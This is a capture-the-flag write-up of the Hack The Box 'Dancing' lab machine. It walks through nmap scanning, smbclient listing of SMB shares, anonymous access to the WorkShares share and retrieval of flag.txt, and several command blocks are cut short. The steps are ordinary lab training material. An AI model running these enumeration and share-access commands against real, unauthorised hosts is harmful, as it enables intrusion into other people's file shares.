## TL;DR

This writeup is based on the [__Dancing__](https://app.hackthebox.com/starting-point){:target="_blank"} machine, an easy-rated Windows box on Hack The Box. I began by scanning the target and found open `SMB ports (135, 139, and 445)`. Enumerating `SMB shares` revealed an accessible share named `WorkShares`, which contained directories belonging to two users: `Amy.J` and `James.P`. Inside these directories, I found two files: `worknotes.txt` and `flag.txt`. I downloaded `flag.txt`, read its contents, and captured the flag.


## Scanning Network

I started with a Nmap scan, I found ports 135, 139, 445 as Windows RPC, NetBIOS-ssn and Microsoft-ds, respectively. Letâ€™s see the Nmap results.

```bash
nmap -sC -sV -A -T4 -Pn 10.129.129.86 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-15 12:38 IST

## Enumeration

`Windows RPC` is used for remote procedure calls on Windows systems. It's often associated with various Windows services. I can enumerate `RPC` service further using `rpcclient` or `wmiexec`.

`NetBION-ssn` is used for file and printer sharing in older Windows versions. NetBIOS could allow for enumeration of shares and users on the system. I can enumerate shares, users and other information using `nmblookup` or `enum4linux`.

`Microsoft-DS` is used by modern versions of Windows for SMB (Server Message Block). I can enumerate SMB shares, users and more using `smbclient` or `smbmap`.

Let's start wby checking available `SMB` shares with `smbclient`.

```bash
smbclient -L //10.129.129.86 --option='client min protocol=SMB2'        

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
```

## Exploitation

The `WorkShares` share is accessible, so I attempted to connect to it.

```bash
smbclient \\\\10.129.129.86\\WorkShares --option='client min protocol=SMB2'

```

I listed the files inside the `WorkShares` directory:

```bash
smbclient \\\\10.129.72.82\\WorkShares --option='client min protocol=SMB2'
Try "help" to get a list of possible commands.
smb: \> ls

There are two directories, `Amy.J` and `James.P`. I explored their contents.

```bash
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 14:38:24 2021

```

I have found two files named as `worknotes.txt` and `flag.txt` which means I have got the flag.

```bash
cat flag.txt
